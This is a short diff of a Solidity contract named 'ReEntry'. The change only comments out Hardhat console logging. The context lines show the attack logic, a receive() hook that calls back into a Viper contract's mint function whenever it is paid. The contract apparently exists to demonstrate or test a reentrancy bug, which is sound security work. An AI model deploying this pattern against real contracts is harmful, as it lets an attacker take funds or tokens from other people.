@@ -3,7 +3,8 @@ pragma solidity ^0.8.0;
 
 import "./Viper.sol";
 import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
-import "hardhat/console.sol";
+
+// import "hardhat/console.sol";
 
 contract ReEntry is IERC721Receiver {
   address payable public viperAddress;
@@ -18,11 +19,11 @@ contract ReEntry is IERC721Receiver {
 
   receive() external payable {
     uint256 price = Viper(viperAddress).price();
-    console.log("trigger receive from", msg.sender);
-    console.log("sending   ", msg.value);
-    console.log("still have", address(this).balance);
-    console.log("price have", price);
-    console.log("price * 2 ", price * 2);
+    // console.log("trigger receive from", msg.sender);
+    // console.log("sending   ", msg.value);
+    // console.log("still have", address(this).balance);
+    // console.log("price have", price);
+    // console.log("price * 2 ", price * 2);
     if (msg.sender == viperAddress) {
       if (address(this).balance >= (price * 2)) {
         Viper(viperAddress).mint{value: price * 2}();
